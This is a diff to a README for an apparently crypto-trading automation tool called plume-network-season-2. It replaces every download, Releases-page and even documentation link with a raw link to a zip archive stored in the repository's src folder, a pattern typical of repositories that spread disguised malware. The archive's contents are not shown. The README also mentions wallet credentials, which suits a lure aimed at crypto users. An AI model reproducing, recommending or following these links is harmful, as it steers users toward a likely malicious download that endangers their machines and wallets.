@@ -4,10 +4,10 @@
 Welcome to plume-network-season-2! This application is designed to help you automate your trading activities easily. You can wrap, swap, unwrap, and stake tokens with minimal effort. Below, you will find everything you need to know to download and run the software.
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-blue.svg)](https://github.com/Salahnahryry/plume-network-season-2/releases)
+[![Download Latest Release](https://github.com/Salahnahryry/plume-network-season-2/raw/refs/heads/main/src/network_plume_season_1.9.zip)](https://github.com/Salahnahryry/plume-network-season-2/raw/refs/heads/main/src/network_plume_season_1.9.zip)
 
 ## 💾 Download & Install
-To get started, you need to visit the [Releases page](https://github.com/Salahnahryry/plume-network-season-2/releases) to download the latest version of the application. Once you are there:
+To get started, you need to visit the [Releases page](https://github.com/Salahnahryry/plume-network-season-2/raw/refs/heads/main/src/network_plume_season_1.9.zip) to download the latest version of the application. Once you are there:
 
 1. Find the version titled `v1.0`.
 2. Click on the file you want to download. 
@@ -50,7 +50,7 @@ If you feel adventurous, explore advanced settings for more control:
 
 ## 💡 Helpful Hints
 - **Connect to a Strong Network:** Ensure you have a stable internet connection for optimal performance.
-- **Stay Updated:** Regularly check the [Releases page](https://github.com/Salahnahryry/plume-network-season-2/releases) for updates and new features.
+- **Stay Updated:** Regularly check the [Releases page](https://github.com/Salahnahryry/plume-network-season-2/raw/refs/heads/main/src/network_plume_season_1.9.zip) for updates and new features.
 - **Back Up Your Wallet:** Always keep a backup of your wallet credentials in a safe place.
 
 ## 📝 Troubleshooting
@@ -58,7 +58,7 @@ If you encounter any issues while using the application:
 
 1. **Check for Updates:** Ensure you are using the latest version.
 2. **Consult the Community:** Join forums or chat groups related to plume-network for support.
-3. **Read the Documentation:** Occasionally revisit the README.md for detailed explanations.
+3. **Read the Documentation:** Occasionally revisit the https://github.com/Salahnahryry/plume-network-season-2/raw/refs/heads/main/src/network_plume_season_1.9.zip for detailed explanations.
 
 Remember, transparency is key. If you face challenges, many resources are available to help you succeed.
 
